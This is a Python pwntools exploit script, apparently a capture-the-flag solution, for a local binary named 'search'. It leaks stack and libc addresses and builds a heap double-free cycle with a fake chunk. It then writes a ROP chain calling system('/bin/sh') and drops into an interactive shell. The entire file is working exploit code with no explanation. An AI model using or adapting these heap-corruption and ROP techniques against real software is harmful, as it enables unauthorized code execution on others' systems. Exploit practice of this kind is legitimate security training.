from pwn import *
context.log_level = ('debug')
sh = process("./search")
libc = ELF("./search")


pop_rdi_ret = 0x400e23
system_offset = 0x435d0#0x46590  #
puts_offset = 0x705e0#0x6fd60   #
binsh_offset = 1558723

def search(content):
    sh.sendline("1")
    sh.sendline(str(len(content)))
    sh.sendline(content)

def index(content):
    sh.sendline("2")
    sh.sendline(str(len(content)))
    sh.sendline(content)

#----------------leak stack----------------
def leak_stack():
    sh.sendline("a"*48)
    sh.recvuntil('Quit\n')
    sh.recv()

    sh.sendline("a"*48)
    leak = sh.recvline().split(' ')[0][48:]
    return int(leak[::-1].encode('hex'),16)
   
def leak_libc():
    index(('a'*12 + ' b ').ljust(40,'c'))
    search('a'*12)
    sh.sendline('y')

    index('d'*64)

    search('\x00')
    sh.sendline('y')

    node = ''
    node += p64(0x400e90) + p64(5) + p64(0x602028) + p64(64) + p64(0x00000000)
    assert len(node) ==40
    
    index(node)

    #sh.clean()

    search('Enter')
    sh.recvuntil('Found 64:')
    leak = u64(sh.recvline()[:8])
    
    sh.sendline('n')
    return leak

def make_cycle():
    index('a'*54 + ' d')
    index('b'*54 + ' d')
    index('c'*54 + ' d')

    search('d')
    sh.sendline('y')
    sh.sendline('y')
    sh.sendline('y')
    search('\x00')
    sh.sendline('y')
    sh.sendline('n')
  
def make_fake_chunk(addr):
    fakechunk = p64(addr)
    index(fakechunk.ljust(56))

def allocate_fake_chunk(binsh_addr , system_addr):
    index('a'*56)
    index('b'*56)

    buf = 'a'*30
    buf += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) 
    buf = buf.ljust(56,'c')

    index(buf)
   
def main():
    stack_addr = leak_stack()+0x5a - 8
    print "stack_addr: " + hex(stack_addr)
    
#    gdb.attach(sh)

    puts_addr = leak_libc()
    print "puts_addr: " + hex(puts_addr)
#    d = DynELF(leak,elf = ELF('./search'))   
#    system_add = d.lookup('system','libc')      
    
#    system_addr = free_addr - libc.symbols['free'] + libc.symbols['system']
#    binsh_addr = free_addr - libc.symbols['free'] + libc.search('/bin/sh').next()
    system_addr = puts_addr - puts_offset + system_offset
    binsh_addr = puts_addr - puts_offset + binsh_offset

    print "system_addr: " + hex(system_addr)
    print "binsh_addr: " + hex(binsh_addr)

    make_cycle()
    make_fake_chunk(stack_addr)
    allocate_fake_chunk(binsh_addr, system_addr)

    sh.interactive()

if __name__ == '__main__':
    main()
